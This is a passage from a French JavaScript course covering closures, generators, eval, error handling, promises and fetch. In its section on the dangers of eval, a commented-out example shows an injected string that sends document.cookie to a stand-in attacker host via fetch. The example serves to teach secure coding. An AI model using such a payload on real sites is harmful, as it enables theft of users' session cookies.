const composer = (...fns) => x => fns.reduceRight((acc, f) => f(acc), x);   // de droite à gauche
const pipe = (...fns) => x => fns.reduce((acc, f) => f(acc), x);            // de gauche à droite
const traiter = pipe(s => s.trim(), s => s.toUpperCase(), s => `${s}!`);
console.log(traiter('  salut  '));               // 'SALUT!'
console.log(composer(x => x * 2, x => x + 1)(5));   // 12 : x + 1 d'abord
```

#### Fonctions pures et effets de bord

Une fonction est **pure** si, pour les mêmes arguments, elle renvoie toujours le même résultat et ne modifie rien d'extérieur (pas d'écriture globale, pas d'E/S, pas de mutation de ses arguments). Les fonctions pures sont faciles à tester, à mettre en cache et à combiner. Isolez les **effets de bord** (réseau, DOM, console) dans quelques endroits bien identifiés.

### 12.8 Fonctions immédiatement invoquées (IIFE)

```javascript
(function () {
    const prive = 'isolé';
    console.log(prive);
})();
console.log(typeof prive);   // 'undefined' : la variable n'existe pas en dehors
```

Une **IIFE** crée une portée privée à usage unique. Elle est moins utile depuis que les **modules** et les **blocs `{ }`** (avec `let` / `const`) offrent leur propre portée ; elle reste courante pour exécuter du code `async` au niveau supérieur d'un script classique : `(async () => { ... })();`.

### 12.9 Récursivité

Une fonction **récursive** s'appelle elle-même. Elle nécessite un **cas de base** (arrêt) et un **cas récursif** qui se rapproche du cas de base.

```javascript
const factorielle = n => (n <= 1 ? 1 : n * factorielle(n - 1));
console.log(factorielle(5));   // 120

const somme = ([tete, ...queue]) => (tete === undefined ? 0 : tete + somme(queue));
console.log(somme([1, 2, 3, 4]));   // 10

try {
    const sansFin = () => sansFin();   // pas de cas de base
    sansFin();
} catch (e) {
    console.error(e.name);             // RangeError : Maximum call stack size exceeded
}
```

La **pile d'appels** est limitée (de l'ordre de dizaines de milliers de niveaux) : pour de grandes profondeurs, transformez la récursion en **boucle** ou en structure explicite (pile, file).

### 12.10 Mémoïsation

La **mémoïsation** mémorise les résultats d'une fonction **pure** pour éviter de les recalculer ; elle repose sur une fermeture qui conserve le cache.

```javascript
function memoiser(fn) {
    const cache = new Map();
    return (arg) => {
        if (cache.has(arg)) return cache.get(arg);
        const resultat = fn(arg);
        cache.set(arg, resultat);
        return resultat;
    };
}

let appels = 0;
const fibonacci = memoiser((n) => { appels++; return n < 2 ? n : fibonacci(n - 1) + fibonacci(n - 2); });
console.log(fibonacci(40), appels);   // 102334155 41 : linéaire au lieu d'exponentiel
```

Précautions : le cache grossit indéfiniment (limitez-le si besoin) et la mémoïsation n'a de sens que pour des fonctions pures.

### 12.11 Documenter : JSDoc

```javascript
/**
 * Calcule l'aire d'un rectangle.
 * @param {number} largeur - Largeur en mètres.
 * @param {number} hauteur - Hauteur en mètres.
 * @returns {number} L'aire en mètres carrés.
 */
function aire(largeur, hauteur) { return largeur * hauteur; }
console.log(aire(3, 4));   // 12
```

Les éditeurs exploitent JSDoc pour l'autocomplétion, et TypeScript peut le vérifier (`// @ts-check`).

### 12.12 Bonnes pratiques

- Fonctions **courtes**, à responsabilité unique, **nommées** par un verbe (`calculerTotal`).
- Au-delà de 3 paramètres, passez **un objet** avec décomposition.
- Évitez les effets de bord, les variables globales et la mutation des arguments.
- Préférez les fléchées pour les callbacks, les fonctions classiques ou méthodes courtes pour les méthodes d'objet.
- Évitez `arguments` : utilisez `...reste`.

### Points clés du module 12

- Trois formes : déclaration (hoistée), expression, fléchée (`this` lexical).
- Portée lexicale : une fonction voit les variables de l'endroit où elle est **écrite**.
- Une fermeture garde vivantes les variables de sa portée d'origine ; elle permet l'état privé et les fabriques.
- `this` dépend de l'appel ; `call`, `apply` et `bind` le fixent explicitement.

## 13. Itérateurs et générateurs

### 13.1 Le protocole d'itération

Un **itérable** est un objet possédant une méthode **`[Symbol.iterator]()`** qui renvoie un **itérateur**. Un **itérateur** est un objet doté d'une méthode **`next()`** renvoyant `{ value, done }` : `done` vaut `false` tant qu'il reste des valeurs, puis `true`. Tableaux, chaînes, `Map`, `Set`, `NodeList`, arguments et générateurs sont itérables.

```javascript
const it = [10, 20][Symbol.iterator]();
console.log(it.next());   // { value: 10, done: false }
console.log(it.next());   // { value: 20, done: false }
console.log(it.next());   // { value: undefined, done: true }
```

Le protocole alimente de nombreuses constructions : `for...of`, spread `[...x]`, décomposition `[a, b] = x`, `Array.from(x)`, `new Map(x)`, `new Set(x)`, `Promise.all(x)`, `Object.fromEntries(x)`.

#### Écrire un itérable à la main

```javascript
const plage = {
    debut: 1,
    fin: 4,
    [Symbol.iterator]() {
        let courant = this.debut;
        const fin = this.fin;
        return {
            next: () => (courant <= fin ? { value: courant++, done: false } : { value: undefined, done: true }),
            return() { console.log('sortie anticipée'); return { done: true }; },   // facultatif : nettoyage
        };
    },
};
console.log([...plage]);                            // [1, 2, 3, 4]
for (const n of plage) { if (n === 2) break; }      // déclenche return() : 'sortie anticipée'
```

La méthode facultative **`return()`** est appelée quand la consommation s'interrompt (`break`, exception, décomposition partielle) : c'est le lieu pour libérer une ressource.

**Itérable ≠ itérateur** : un tableau est itérable (on peut obtenir plusieurs itérateurs indépendants) ; un itérateur est **à usage unique** et s'épuise. Les itérateurs natifs sont eux-mêmes itérables (`it[Symbol.iterator]() === it`).

### 13.2 Générateurs

Une **fonction génératrice** (`function*`) renvoie un **générateur**, c'est-à-dire un itérateur dont le code s'exécute **par morceaux**. `yield` produit une valeur et **suspend** l'exécution jusqu'à l'appel suivant de `next()`. Les valeurs sont produites **à la demande** (évaluation paresseuse), ce qui permet les **séquences infinies**.

```javascript
function* compteARebours(n) {
    while (n > 0) yield n--;
}
console.log([...compteARebours(3)]);   // [3, 2, 1]

function* naturels() { let i = 0; while (true) yield i++; }   // infini : sans danger car paresseux
const gen = naturels();
console.log(gen.next().value, gen.next().value, gen.next().value);   // 0 1 2
```

#### Communication bidirectionnelle

`next(valeur)` **envoie** une valeur qui devient le résultat de l'expression `yield` ; `return(v)` termine le générateur ; `throw(e)` y lève une exception.

```javascript
function* conversation() {
    const nom = yield 'Quel est votre nom ?';      // suspend ; reçoit la valeur de next(...)
    const age = yield `Bonjour ${nom}, quel âge ?`;
    return `${nom} a ${age} ans`;
}
const c = conversation();
console.log(c.next().value);          // 'Quel est votre nom ?'   (le 1er next ne transmet pas de valeur)
console.log(c.next('Alice').value);   // 'Bonjour Alice, quel âge ?'
console.log(c.next(30));              // { value: 'Alice a 30 ans', done: true }
```

#### Délégation avec `yield*`

```javascript
function* abc() { yield 'a'; yield 'b'; }
function* tout() { yield 1; yield* abc(); yield* [2, 3]; }   // yield* délègue à tout itérable
console.log([...tout()]);   // [1, 'a', 'b', 2, 3]
```

#### Rendre un objet itérable

```javascript
class Playlist {
    #titres = ['A', 'B'];
    *[Symbol.iterator]() { yield* this.#titres; }
}
console.log([...new Playlist()]);
for (const titre of new Playlist()) console.log(titre);
```

#### Cas d'usage

Parcours d'arbres (`yield*` récursif), pagination, lecture de gros volumes ligne par ligne, générateurs d'identifiants, machines à états, séquences mathématiques, traitement en flux sans tout charger en mémoire.

```javascript
function* parcourir(noeud) {          // parcours d'un arbre en profondeur
    yield noeud.valeur;
    for (const enfant of noeud.enfants ?? []) yield* parcourir(enfant);
}
const arbre = { valeur: 1, enfants: [{ valeur: 2 }, { valeur: 3, enfants: [{ valeur: 4 }] }] };
console.log([...parcourir(arbre)]);   // [1, 2, 3, 4]
```

### 13.3 Assistants d'itérateurs (ES2025)

Les itérateurs disposent de méthodes **paresseuses** analogues à celles des tableaux : `map`, `filter`, `take`, `drop`, `flatMap` (renvoient des itérateurs), et `toArray`, `reduce`, `forEach`, `some`, `every`, `find` (consomment). `Iterator.from(itérable)` enveloppe n'importe quel itérable. Chaque valeur traverse toute la chaîne **une à une** : aucun tableau intermédiaire, et la production s'arrête dès que le consommateur a ce qu'il faut.

```javascript
function* naturels() { let i = 0; while (true) yield i++; }

console.log(
    naturels()
        .filter(n => n % 2 === 0)
        .map(n => n * n)
        .take(5)
        .toArray()            // [0, 4, 16, 36, 64]
);

console.log(naturels().drop(3).take(2).toArray());               // [3, 4]
console.log(Iterator.from([1, 2, 3]).reduce((a, b) => a + b));   // 6
console.log(Iterator.concat([1, 2], [3, 4]).toArray());          // [1, 2, 3, 4] (ES2026)
```

### 13.4 Générateurs asynchrones et `for await...of`

Un **itérable asynchrone** possède `[Symbol.asyncIterator]()` dont `next()` renvoie une **promesse** de `{ value, done }`. Un **générateur asynchrone** (`async function*`) combine `await` et `yield` ; on le consomme avec **`for await...of`** (dans une fonction `async` ou un module).

```javascript
// Simule une API paginée (avec fetch : yield await (await fetch(`${url}?page=${p}`)).json())
async function* pages(total) {
    for (let p = 1; p <= total; p++) {
        await new Promise((resolve) => setTimeout(resolve, 200));   // latence simulée
        yield { page: p, items: [`élément ${p}`] };
    }
}

(async () => {
    for await (const page of pages(3)) console.log(page);   // une page à la fois, à mesure qu'elles arrivent
})();
```

Exemples réels : lecture d'un `ReadableStream` (`for await (const bloc of reponse.body)`), flux d'événements serveur, lectures de fichiers ou de sockets dans Node.js. Avec `break`, la méthode `return()` du générateur est appelée, ce qui permet de fermer proprement la source.

### 13.5 Bonnes pratiques et pièges

- Un générateur **épuisé** ne repart pas : recréez-le en rappelant la fonction génératrice.
- Ne consommez pas **deux fois** le même itérateur en espérant les mêmes valeurs.
- Pour de petites collections finies, un tableau reste plus simple ; réservez les générateurs aux flux volumineux, infinis ou à production coûteuse.
- Dans `for await...of`, les itérations sont **séquentielles** ; pour paralléliser, collectez les promesses et utilisez `Promise.all`.
- Gérez les erreurs : une exception levée dans un générateur se propage au consommateur.

### Points clés du module 13

- Itérable = `[Symbol.iterator]()` ; itérateur = `next()` → `{ value, done }`.
- Un générateur (`function*`, `yield`) est un itérateur paresseux, suspendable et bidirectionnel.
- Les assistants d'itérateurs (`map`, `filter`, `take`…) chaînent des traitements sans tableaux intermédiaires.
- `async function*` et `for await...of` traitent des flux asynchrones.

## 14. `eval` et ses alternatives

### 14.1 Qu'est-ce que `eval` ?

`eval(chaine)` **compile et exécute du code JavaScript contenu dans une chaîne**, à l'exécution. Si la chaîne est une expression, `eval` renvoie sa valeur.

```javascript
console.log(eval('2 + 3 * 4'));      // 14
let x = 10;
eval('x = x + 1');                   // eval directe : accède à la portée locale et la modifie
console.log(x);                      // 11
```

#### Variantes

| Forme | Comportement |
| --- | --- |
| `eval(code)` (**directe**) | S'exécute dans la **portée locale** : voit et modifie les variables environnantes |
| `(0, eval)(code)` ou `const e = eval; e(code)` (**indirecte**) | S'exécute dans la **portée globale** uniquement |
| `new Function('a', 'b', 'return a + b')` | Crée une fonction à partir de chaînes ; portée **globale** uniquement |
| `setTimeout('code', 0)` (forme chaîne) | Évalue aussi une chaîne : équivalent à `eval`, à proscrire |

### 14.2 Pourquoi l'éviter ?

| Risque | Détail |
| --- | --- |
| **Sécurité** | **Injection de code** : si la chaîne contient des données non fiables, l'attaquant exécute son propre code avec les droits de la page (vol de cookies, de jetons, détournement : attaque XSS). |
| **Performances** | Le moteur ne peut plus raisonner statiquement sur la portée : il désactive des optimisations. Le code est de plus recompilé à chaque appel. |
| **Portée** | Une `eval` directe peut lire, modifier ou créer des variables locales de façon invisible pour le lecteur. |
| **CSP** | Une *Content Security Policy* stricte interdit `eval` (sauf directive `'unsafe-eval'`, à éviter). Votre code cesserait de fonctionner. |
| **Maintenance** | Pas d'analyse statique, pas d'autocomplétion, débogage difficile. |

> **Règle** : n'exécutez **jamais** `eval` (ni `new Function`) sur des données provenant d'un utilisateur, d'un paramètre d'URL, du réseau ou d'un stockage modifiable.

```javascript
// Scénario d'attaque : une « calculatrice » naïve
const saisie = "fetch('https://pirate.exemple/vol?c=' + document.cookie)";
// eval(saisie);   // JAMAIS : exécuterait du code arbitraire
```

### 14.3 Alternatives sûres selon le besoin

```javascript
// 1. Lire des données : JSON.parse, jamais eval
console.log(JSON.parse('{"a": 1}'));            // { a: 1 }

// 2. Choisir un comportement : table de fonctions
const operations = { '+': (a, b) => a + b, '-': (a, b) => a - b, '*': (a, b) => a * b };
const op = '+', x = 4, y = 3;
console.log(operations[op]?.(x, y));            // 7 : seules les opérations prévues sont possibles

// 3. Accès dynamique à une propriété : notation crochets
const obj = { couleur: 'rouge' };
const nomDePropriete = 'couleur';
console.log(obj[nomDePropriete]);               // 'rouge'

// 4. Appeler une fonction par son nom : dictionnaire explicite
const handlers = { saluer: (n) => `Salut ${n}` };
console.log(handlers['saluer']('Alice'));

// 5. Charger du code dynamiquement : import() (modules)
// const { dessiner } = await import('./graphique.js');
```

- **Évaluer des expressions mathématiques saisies** : bibliothèque dédiée (**math.js**, qui analyse sans exécuter de JavaScript) ou analyseur maison (algorithme *shunting-yard*).
- **Gabarits** : utilisez les gabarits de chaînes (`` `...${x}` ``) ou un moteur de templates qui échappe les valeurs.
- **Isolation de code tiers** : `<iframe sandbox>`, Web Workers, ou machine virtuelle dédiée ; `eval` n'est pas un bac à sable.
- En **mode strict**, `eval` possède **sa propre portée de variables** : les `var` et fonctions qu'elle déclare ne fuient pas dans la portée appelante.

### 14.4 Cas où l'on le rencontre

`eval` reste présent dans des outils de développement (consoles, REPL, hot reload), des moteurs de templates anciens et du code hérité. Dans une application neuve, vous n'en avez presque jamais besoin.

### Points clés du module 14

- `eval` exécute une chaîne comme du code : dangereux (injection), lent, incompatible avec une CSP stricte.
- `new Function` partage les mêmes risques ; `eval` indirecte s'exécute en portée globale.
- Alternatives : `JSON.parse`, tables de fonctions, accès par crochets, `import()`, bibliothèques d'analyse.

## 15. Gestion des erreurs et mode strict

### 15.1 Notions et types d'erreurs

Une **erreur** (ou **exception**) interrompt le déroulement normal ; elle **remonte la pile d'appels** jusqu'à un bloc `catch` qui la traite, sinon elle **arrête** le programme (ou la tâche en cours). On distingue les erreurs de **syntaxe** (détectées avant l'exécution), de **programmation** (bogues : `TypeError`, `ReferenceError`) et d'**exécution attendues** (réseau indisponible, saisie invalide), qu'il faut prévoir.

| Type | Cause typique |
| --- | --- |
| `SyntaxError` | Code invalide, ou `JSON.parse` sur du JSON invalide |
| `ReferenceError` | Variable inexistante ou en TDZ |
| `TypeError` | Opération sur un type inadapté (`null.x`, appel d'une non-fonction, écriture sur `const`) |
| `RangeError` | Valeur hors limites (`new Array(-1)`, récursion trop profonde, `toFixed(200)`) |
| `URIError` | Mauvais usage de `decodeURIComponent` |
| `EvalError` | Historique (`eval`) |
| `AggregateError` | Regroupe plusieurs erreurs (`Promise.any`) |
| `DOMException` | Erreurs des API du navigateur (`AbortError`, `QuotaExceededError`) |

Toute erreur possède : `name` (type), `message` (description), `stack` (pile d'appels, texte non standardisé) et, depuis ES2022, `cause`.

### 15.2 `try` / `catch` / `finally`

```javascript
const texte = '{ pas du JSON';

try {
    const donnees = JSON.parse(texte);
    console.log(donnees);                // non atteint
} catch (erreur) {
    console.error(erreur.name, erreur.message);   // SyntaxError ...
} finally {
    console.log('Toujours exécuté');     // nettoyage : exécuté avec ou sans erreur, même après un return
}

try { JSON.parse('{'); } catch { console.error('JSON invalide (liaison facultative : l\'erreur ne sert pas)'); }
```

Points précis : `catch` n'intercepte que les erreurs de son bloc `try` **synchrone** (pas celles d'un callback asynchrone planifié) ; `finally` s'exécute toujours, et un `return` dans `finally` **écrase** celui du `try`.

### 15.3 Lever et personnaliser des erreurs

`throw` lève n'importe quelle valeur, mais **levez toujours des objets `Error`** (ils portent une pile d'appels, au contraire des chaînes).

```javascript
function diviser(a, b) {
    if (b === 0) throw new RangeError('Division par zéro');
    return a / b;
}

class ErreurValidation extends Error {
    constructor(message, champ, options) {
        super(message, options);
        this.name = 'ErreurValidation';
        this.champ = champ;
    }
}

try {
    console.log(diviser(6, 3));          // 2
    console.log(diviser(1, 0));          // lève une RangeError
} catch (e) {
    console.error(e.name, e.message);    // RangeError Division par zéro
}

try {
    throw new ErreurValidation('Champ obligatoire', 'email');
} catch (e) {
    if (e instanceof ErreurValidation) console.error('Validation :', e.champ, e.message);
    else throw e;                        // erreur inattendue : on la relance, on ne l'avale pas
}

// Chaînage de causes (ES2022) : conserver l'erreur d'origine
try {
    try { JSON.parse('{'); }
    catch (e) { throw new Error('Configuration illisible', { cause: e }); }
} catch (e) {
    console.error(e.message, '<-', e.cause.name);   // Configuration illisible <- SyntaxError
}
```

`Error.isError(valeur)` (ES2026) teste de façon fiable si une valeur est une erreur, même créée dans un autre contexte (iframe), là où `instanceof Error` échoue.

#### Erreurs multiples

```javascript
Promise.any([Promise.reject(new Error('a')), Promise.reject(new Error('b'))])
    .catch((e) => console.error(e.name, e.errors.map(x => x.message)));   // AggregateError ['a', 'b']
```

### 15.4 Erreurs asynchrones

Un `try...catch` autour d'un appel **non attendu** n'attrape rien : l'erreur surviendra plus tard, hors du bloc. Il faut `await` (dans une fonction `async`) ou `.catch()`.

```javascript
const url = 'https://jsonplaceholder.typicode.com/todos/99999';   // ressource inexistante (404)

// Avec async/await
(async () => {
    try {
        const r = await fetch(url);
        if (!r.ok) throw new Error(`HTTP ${r.status}`);   // fetch ne rejette pas sur un 404 : à vous de tester
    } catch (e) {
        console.error('async/await :', e.message);        // HTTP 404
    }
})();

// Avec les promesses
fetch(url)
    .then((r) => { if (!r.ok) throw new Error(`HTTP ${r.status}`); })
    .catch((e) => console.error('promesses :', e.message));

// Filets de sécurité globaux : journalisation, pas traitement normal
if (typeof window !== 'undefined') {
    window.addEventListener('error', (e) => console.error('Erreur non interceptée :', e.message));
    window.addEventListener('unhandledrejection', (e) => console.error('Promesse rejetée :', e.reason));
} else {
    process.on('uncaughtException', (e) => console.error('Erreur non interceptée :', e.message));
    process.on('unhandledRejection', (raison) => console.error('Promesse rejetée :', raison));
}
```

### 15.5 Mode strict (`'use strict'`)

Le **mode strict** (ES5) est une variante plus sûre du langage : il **transforme des erreurs silencieuses en exceptions** et interdit des constructions ambiguës. Il s'active par la directive `'use strict';` en tête d'un fichier ou d'une fonction.

```javascript
'use strict';

const essayer = (description, code) => {
    try { code(); } catch (e) { console.error(`${description} : ${e.name}`); }
};

essayer('variable non déclarée', () => { x = 10; });                                  // ReferenceError
essayer('écriture sur objet gelé', () => { const o = Object.freeze({ a: 1 }); o.a = 2; });   // TypeError
essayer('suppression interdite', () => { delete Object.prototype; });                 // TypeError
essayer('paramètres dupliqués', () => new Function('"use strict"; function f(a, a) {}'));   // SyntaxError
```

| Changement en mode strict | Effet |
| --- | --- |
| Variable non déclarée | `ReferenceError` (plus de globale accidentelle) |
| `this` d'une fonction appelée simplement | `undefined` (au lieu de `globalThis`) |
| Écritures interdites (propriété en lecture seule, objet gelé, chaîne) | `TypeError` |
| Suppression d'une propriété non configurable | `TypeError` |
| Paramètres de même nom | `SyntaxError` |
| Mots réservés futurs (`let`, `static`, `implements`, `interface`, `package`…) | Interdits comme identifiants |
| Littéraux octaux hérités (`010`), `with` | Interdits |
| `arguments` | Non lié aux paramètres nommés |
| `eval` | Portée de variables propre |

> **Les modules ES et le corps des classes sont automatiquement en mode strict** : dans du code moderne, `'use strict'` explicite est rarement nécessaire (il l'est toujours dans un script classique ou un fichier CommonJS).

### 15.6 Stratégie de gestion des erreurs

- **Attrapez là où vous pouvez agir** : réessayer, proposer une valeur de repli, informer l'utilisateur. Sinon laissez remonter.
- **Ne taisez jamais** une erreur (`catch {}` vide) : journalisez ou relancez.
- Distinguez les **erreurs attendues** (validation, réseau : message utilisateur clair) des **bogues** (journalisation complète et correction).
- **Validez les entrées** aux frontières (formulaires, API) avec des messages précis.
- Journalisez avec contexte (identifiant, paramètres) ; ne journalisez pas de données sensibles.
- N'affichez pas la pile d'appels à l'utilisateur final.
- Pour les réessais, utilisez une temporisation croissante (*backoff*) et un nombre maximal de tentatives.

### Points clés du module 15

- Les erreurs remontent la pile ; `try/catch/finally` les traite ; `throw new Error(...)` les lève.
- `catch` ne voit pas les erreurs asynchrones non attendues : utilisez `await` ou `.catch()`.
- `fetch` ne rejette pas sur un statut HTTP d'erreur.
- Le mode strict transforme des erreurs silencieuses en exceptions ; modules et classes y sont toujours.

## 16. JavaScript asynchrone

### 16.1 Synchrone, asynchrone et boucle d'événements

JavaScript exécute votre code sur **un seul fil** (*single-threaded*) : une instruction à la fois. Pour ne pas figer l'interface pendant une opération longue (réseau, minuterie, lecture de fichier), l'**environnement** exécute ces tâches **en dehors** du fil principal, puis replace leur **rappel** (callback) dans une file. La **boucle d'événements** (*event loop*) vérifie en permanence : « la pile d'appels est-elle vide ? » ; si oui, elle prend la tâche suivante.

Composants :

- **Pile d'appels** (*call stack*) : fonctions en cours d'exécution.
- **File des macrotâches** (*task queue*) : callbacks de `setTimeout`, `setInterval`, événements DOM, E/S.
- **File des microtâches** : callbacks de `Promise.then/catch/finally`, `await` (reprise), `queueMicrotask`, `MutationObserver`.

Après chaque macrotâche, **toutes les microtâches** sont vidées avant de passer à la macrotâche suivante (et avant tout rendu).

```javascript
console.log('1');
setTimeout(() => console.log('4 (macrotâche)'), 0);
Promise.resolve().then(() => console.log('3 (microtâche)'));
console.log('2');
// Ordre d'affichage : 1, 2, 3, 4
```

Conséquence importante : une **boucle longue ou un calcul lourd** bloque tout (clics, rendu). Découpez le travail, utilisez un **Web Worker**, ou rendez la main régulièrement.

### 16.2 Minuteries

```javascript
const id = setTimeout(() => console.log('Jamais affiché'), 2000);
clearTimeout(id);                                    // annulé avant l'échéance

let n = 0;
const iv = setInterval(() => {
    console.log('Tick', ++n);                        // toutes les secondes
    if (n === 3) clearInterval(iv);                  // arrêt après 3 exécutions
}, 1000);

setTimeout((a, b) => console.log(a + b), 100, 1, 2); // arguments supplémentaires : affiche 3
```

#### `setTimeout` récursif ou `setInterval` ?

`setInterval` ne tient pas compte de la durée du traitement : les appels peuvent s'empiler. Un `setTimeout` **récursif** garantit un délai entre la **fin** d'un traitement et le début du suivant :

```javascript
let essais = 0;
const tache = () => Promise.resolve(console.log('Tâche n°', ++essais));

function boucle() {
    if (essais >= 3) return;
    tache().finally(() => setTimeout(boucle, 1000));
}
boucle();
```

> **Attention** : le délai est un **minimum**, non garanti ; les onglets en arrière-plan ralentissent les minuteries. Pour l'**animation**, utilisez `requestAnimationFrame` ; pour du travail non urgent, `requestIdleCallback`.

### 16.3 Les *callbacks* (rappels)

Un **callback** est une fonction passée à une autre pour être appelée plus tard. Convention Node.js : **erreur d'abord** `(err, donnees)`.

```javascript
function lireDonnees(callback) {
    setTimeout(() => callback(null, { id: 1 }), 500);
}
lireDonnees((err, data) => {
    if (err) return console.error(err);
    console.log(data);                               // { id: 1 }
});
```

Imbriqués, les callbacks forment l'**enfer des callbacks** (*callback hell* ou pyramide de la mort) : lecture difficile, gestion d'erreur répétitive, perte de contrôle. Les **promesses** résolvent ces problèmes.

### 16.4 Les promesses (`Promise`)

Une **promesse** représente le **résultat futur** d'une opération asynchrone. Elle a trois états : **en attente** (*pending*), **tenue** (*fulfilled*, avec une valeur), **rejetée** (*rejected*, avec une raison). Une fois réglée (*settled*), elle **ne change plus**.

```javascript
const attendre = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
attendre(500).then(() => console.log('500 ms écoulées'));

const promesse = new Promise((resolve, reject) => {
    const ok = true;
    ok ? resolve('Succès') : reject(new Error('Échec'));
});

promesse
    .then(valeur => valeur.toUpperCase())     // chaînage : chaque then renvoie une NOUVELLE promesse
    .then(console.log)                        // 'SUCCÈS'
    .catch(console.error)                     // intercepte toute erreur survenue plus haut dans la chaîne
    .finally(() => console.log('Terminé'));   // toujours exécuté, ne reçoit pas de valeur

// Raccourcis
Promise.resolve(42).then(console.log);
Promise.reject(new Error('non')).catch((e) => console.error(e.message));
```

Règles du chaînage : une valeur renvoyée par `then` devient la valeur de la promesse suivante ; une **promesse renvoyée** est « aplatie » (la chaîne attend sa résolution) ; une **exception** levée dans un `then` rejette la promesse suivante. **Oublier `return`** dans un `then` est une erreur fréquente : la suite reçoit `undefined`.

### 16.5 `async` / `await`

Syntaxe construite sur les promesses, qui donne au code asynchrone l'allure du code synchrone. Une fonction **`async` renvoie toujours une promesse** ; `await` **suspend la fonction** (pas le fil principal) jusqu'à ce que la promesse soit réglée, puis renvoie sa valeur ou lève son erreur.

```javascript
async function chargerUtilisateur(id) {
    try {
        const reponse = await fetch(`https://jsonplaceholder.typicode.com/users/${id}`);
        if (!reponse.ok) throw new Error(`HTTP ${reponse.status}`);
        return await reponse.json();
    } catch (e) {
        console.error('Chargement impossible :', e.message);
        throw e;                                 // relancer pour que l'appelant sache que ça a échoué
    }
}

chargerUtilisateur(1).then((u) => console.log(u.name));
chargerUtilisateur(99999).catch(() => console.error('Échec attendu : utilisateur inexistant'));
```

`await` s'emploie aussi au **niveau supérieur d'un module** (ES2022) : `const config = await (await fetch(url)).json();`. Une fonction `async` fléchée s'écrit `async () => { ... }`.

### 16.6 Combiner plusieurs opérations

| Méthode | Comportement |
| --- | --- |
| `Promise.all([…])` | Attend **toutes** ; résultats dans l'ordre ; **rejette dès la première** erreur |
| `Promise.allSettled([…])` | Attend toutes ; renvoie `{ status, value / reason }` pour chacune ; ne rejette jamais |
| `Promise.race([…])` | Première **réglée** (réussie ou non) |
| `Promise.any([…])` | Première **réussie** ; `AggregateError` si toutes échouent |
| `Promise.withResolvers()` | Crée `{ promise, resolve, reject }` (ES2024) |
| `Promise.try(fn)` | Exécute `fn` (synchrone ou asynchrone) et renvoie toujours une promesse (ES2025) |

```javascript
const attendre = (ms, valeur) => new Promise((resolve) => setTimeout(() => resolve(valeur), ms));
const chargerA = () => attendre(500, 'A');
const chargerB = () => attendre(500, 'B');

(async () => {
    console.time('séquentiel');
    const a = await chargerA();            // B ne démarre qu'après A
    const b = await chargerB();
    console.timeEnd('séquentiel');         // ≈ 1000 ms

    console.time('parallèle');
    const [x, y] = await Promise.all([chargerA(), chargerB()]);   // les deux démarrent ensemble
    console.timeEnd('parallèle');          // ≈ 500 ms
    console.log(a, b, x, y);

    const resultats = await Promise.allSettled([chargerA(), Promise.reject(new Error('échec'))]);
    console.log(resultats.filter((r) => r.status === 'fulfilled').map((r) => r.value));       // ['A']
    console.error(resultats.filter((r) => r.status === 'rejected').map((r) => r.reason.message));   // ['échec']

    const premier = await Promise.race([attendre(300, 'lent'), attendre(100, 'rapide')]);
    console.log(premier);                  // 'rapide'

    const { promise, resolve } = Promise.withResolvers();    // résoudre depuis l'extérieur
    setTimeout(() => resolve('prêt'), 50);
    console.log(await promise);            // 'prêt'
})();
```

**Limiter la concurrence** : lancer des milliers de requêtes avec `Promise.all` peut saturer le réseau ou le serveur ; traitez par **lots** ou avec un pool de tâches.

### 16.7 Annulation et délais : `AbortController`

```javascript
const url = 'https://jsonplaceholder.typicode.com/todos/1';

const controleur = new AbortController();
controleur.abort();                        // annulation immédiate pour l'exemple

(async () => {
    try {
        await fetch(url, { signal: controleur.signal });
    } catch (e) {
        if (e.name === 'AbortError') console.error('Requête annulée');
        else throw e;
    }
})();

// Raccourci : annulation automatique après un délai
fetch(url, { signal: AbortSignal.timeout(5000) }).then((r) => console.log('Réponse reçue :', r.status));
```

Un `AbortSignal` s'applique aussi aux écouteurs d'événements (module 21) et à vos propres fonctions asynchrones : surveillez `signal.aborted` ou écoutez l'événement `abort`. `AbortSignal.any([...])` combine plusieurs signaux.

### 16.8 Pièges courants

```javascript
// 1. Promesse non attendue : l'erreur est perdue et la suite s'exécute trop tôt
async function oubli() { /* ... */ }
// oubli();                 // manque `await` ou `.catch`

// 2. await dans forEach : ne fonctionne pas comme attendu
// [1, 2, 3].forEach(async (n) => { await attendre(100); });   // le code qui suit n'attend pas

// 3. Séquentiel par erreur : tâches indépendantes attendues l'une après l'autre
// Corriger avec Promise.all

// 4. Callback d'une API non promise : envelopper dans une promesse
const dormir = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
```

- **Promesse rejetée non traitée** : avertissement dans le navigateur ; dans Node.js, arrêt du processus par défaut.
- **Perte de `this`** dans des callbacks : fonction fléchée ou `bind`.
- **Condition de concurrence** (*race condition*) : des réponses revenant dans le désordre écrasent un état plus récent ; annulez la requête précédente avec `AbortController` ou comparez un identifiant de requête.

### 16.9 Bonnes pratiques

- Préférez `async` / `await` aux longues chaînes `.then()`.
- **Gérez toujours les erreurs** (`try/catch` ou `.catch`).
- Parallélisez les tâches **indépendantes** avec `Promise.all` ; séquencez celles qui dépendent les unes des autres.
- Prévoyez **délais d'expiration** et **annulation**.
- Ne mettez pas de `await` dans `forEach`.
- Pour du calcul lourd, déléguez à un **Worker**.

### Points clés du module 16

- Un seul fil ; la boucle d'événements orchestre pile, microtâches et macrotâches ; les microtâches passent avant les macrotâches.
- Une promesse est en attente, tenue ou rejetée ; `then`, `catch`, `finally` se chaînent.
- `async` / `await` rend le code asynchrone lisible ; `Promise.all`, `allSettled`, `race`, `any` combinent les tâches.
- `AbortController` annule ; toute erreur asynchrone doit être traitée.

## 17. APIs web, `fetch` et JSON

### 17.1 Qu'est-ce qu'une API ?

Une **API** (*Application Programming Interface*) est une interface qui permet à deux programmes de communiquer selon un contrat précis. Dans le contexte web, on appelle ainsi deux choses distinctes :

- les **API du navigateur** (DOM, `fetch`, `localStorage`, `geolocation`…) : objets JavaScript fournis par l'environnement ;
- les **API HTTP** (souvent dites « REST ») : services distants interrogés par requêtes HTTP, qui échangent généralement du **JSON**.

Une requête HTTP comporte une **méthode**, une **URL**, des **en-têtes** (*headers*) et éventuellement un **corps** (*body*). La réponse comporte un **code d'état**, des en-têtes et un corps.

| Méthode | Usage | Corps ? |
| --- | --- | --- |
| `GET` | Lire (sans effet de bord) | Non |
| `POST` | Créer | Oui |
| `PUT` | Remplacer entièrement | Oui |
| `PATCH` | Modifier partiellement | Oui |
| `DELETE` | Supprimer | Rarement |

| Famille de codes | Signification |
| --- | --- |
| `2xx` | Succès : `200 OK`, `201 Created`, `204 No Content` |
